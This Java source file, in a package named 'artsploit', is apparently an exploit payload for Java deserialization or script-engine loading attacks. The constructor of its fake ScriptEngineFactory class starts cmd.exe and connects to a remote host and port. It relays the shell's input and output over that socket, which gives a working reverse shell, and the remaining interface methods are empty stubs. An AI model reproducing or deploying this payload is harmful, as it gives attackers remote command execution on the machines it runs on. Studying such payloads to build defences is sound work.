package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() throws java.io.IOException, InterruptedException {
        try {
            
        String host="1.1.1.1";
        int port=3333;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        java.net.Socket s=new java.net.Socket(host,port);
        java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0) {
                so.write(pi.read());
            }
            while(pe.available()>0) {
                so.write(pe.read());
            }
            while(si.available()>0) {
                po.write(si.read());
            }
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override public String getEngineName() { return null; }
    @Override public String getEngineVersion() { return null; }
    @Override public List<String> getExtensions() { return null; }
    @Override public List<String> getMimeTypes() { return null; }
    @Override public List<String> getNames() { return null; }
    @Override public String getLanguageName() { return null; }
    @Override public String getLanguageVersion() { return null; }
    @Override public Object getParameter(String key) { return null; }
    @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
    @Override public String getOutputStatement(String toDisplay) { return null; }
    @Override public String getProgram(String... statements) { return null; }
    @Override public ScriptEngine getScriptEngine() { return null; }
}